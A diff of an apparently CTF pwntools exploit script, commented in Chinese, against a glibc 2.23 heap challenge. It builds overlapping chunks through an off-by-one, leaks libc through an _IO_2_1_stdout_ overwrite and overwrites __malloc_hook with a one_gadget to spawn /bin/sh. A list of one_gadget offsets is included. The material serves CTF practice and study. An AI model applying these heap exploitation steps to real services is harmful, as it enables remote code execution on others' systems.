@@ -49,13 +49,12 @@ libc_base = IO_stderr - libc.symbols['_IO_2_1_stderr_']
 
 from pwn import *
 import sys
-#from LibcSearcher import LibcSearcher
+
 context.log_level = 'debug'
 context.arch='amd64'
 
 local=1
 binary_name='pwn'
-#libc_name='libc.so.6'
 libc_name='libc-2.23.so'
 
 
@@ -106,6 +105,7 @@ while True:
     			libc=ELF("./"+libc_name)
         
 		add(0x18)#0
+		
 		add(0xf8)
 		add(0x68)
 		add(0x18)
@@ -114,8 +114,10 @@ while True:
     		delete(1)
     		#off-by-one，构造堆块重叠
     
+    
 		delete(2)
     		#将目标chunk放入fastbin
+    
     
 		add(0xf8)#1，让fastbin中chunk的fd中保存main_arena+88
 		
@@ -124,11 +126,14 @@ while True:
 		edit(2,'\xdd\x25')
     		#修改低位两字节
 		
+		
 		add(0x68)#4
+		
 		add(0x68)#5，该chunk在`_IO_2_1_stdout_`结构体附近
 		
 		edit(5,'a'*0x33 + p64(0xfbad1800) + p64(0)*3 + '\x00')
 		#填充payload
+    
     
 		IO_stderr = u64(ru("\x7f")[-6:].ljust(8,'\x00'))-192
 		libc_base = IO_stderr - libc.symbols['_IO_2_1_stderr_']
@@ -137,7 +142,9 @@ while True:
     		print 'malloc:' + hex(malloc_hook-0x10)
 		#接收地址
     
+    
 		add(0x18)#6
+		
 		add(0xf8)
 		add(0x68)
 		add(0x18)
@@ -145,17 +152,21 @@ while True:
 		delete(7)
 		delete(8)
 		add(0x168)#7
+		
 		edit(7,'a'*0xf0+p64(0)+p64(0x71)+p64(malloc_hook - 0x23))
 		#故技重施，分配chunk到malloc_hook附近
+		
 		
 		add(0x68,'b')#8
 		add(0x68,'b')#10
 		edit(10,'\x00'*0x13 + p64(libc_base + 0x45226))
 		#填充payload，覆盖malloc_hook为one_gadget
 		
+		
 		cho(1)
     		sla("size?",str(100))
 		#调用malloc
+		
 		
 		ia()
 		break
@@ -164,22 +175,30 @@ while True:
 
 '''
 0x45226 execve("/bin/sh", rsp+0x30, environ)
+
 constraints:
+
 	rax == NULL
 
 
 0x4527a execve("/bin/sh", rsp+0x30, environ)
+
 constraints:
+
   [rsp+0x30] == NULL
 
 
 0xf0364 execve("/bin/sh", rsp+0x50, environ)
+
 constraints:
+
   [rsp+0x50] == NULL
 
 
 0xf1207 execve("/bin/sh", rsp+0x70, environ)
+
 constraints:
+
   [rsp+0x70] == NULL
 '''
 ```
